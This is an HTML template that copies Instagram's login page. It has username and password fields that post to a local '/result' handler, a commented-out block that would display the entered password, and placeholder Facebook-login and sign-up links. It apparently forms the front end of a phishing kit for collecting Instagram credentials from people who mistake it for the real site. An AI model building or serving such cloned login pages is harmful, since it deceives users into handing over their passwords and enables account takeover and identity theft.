<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Instagram login</title>
	<link rel="stylesheet" type="text/css" href="../static/style.css">
	<link rel="stylesheet" type="text/css" href="../static/styles.css">
</head>
<body>
	<div class="goole-browser">
<div class="container">
	<div class="box">
		<div class="heading">
			<img src="../static/735145cfe0a4.png">
		</div>
		<form class="login-form grid" method="POST" action="/result">
			<center style="padding: 3px;">
				{% if error %}
				<h3 style="color: red; font-size: 14px">{{error}}</h3>
				{% endif %}
				<!-- {% if password %}
				<h3 style="color: red;">Name {{password}}</h3>
				{% endif %} -->
			</center>
			<div class="field">
				<input id="username" name="username" type="name" placeholder="Phone number,username, or email">
				<!-- <label for="username">Phone number,username, or email</label> -->
			</div>
			<div class="field">
				<input id="password" name="password" type="password" placeholder="Password">
				<!-- <label for="password">Password</label> -->
			</div>
			<button class="login-button" type="submit" name="login" title="login">Log In</button>
			<div class="separator">
				<div class="line"></div>
				<div>OR</div>
				<div class="line"></div>
			</div>
			<div class="other">
				<button class="fb-login-btn" type="button">
					<i class="fa fa-facebook-official fb-icon"></i>
					<span class="">Log in with Facebook</span>
				</button>
				<a class="forgot-password" href="#">Forgot password?</a>
			</div>
		</form>
	</div>
	<div class="box">
		<p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>		
	</div>
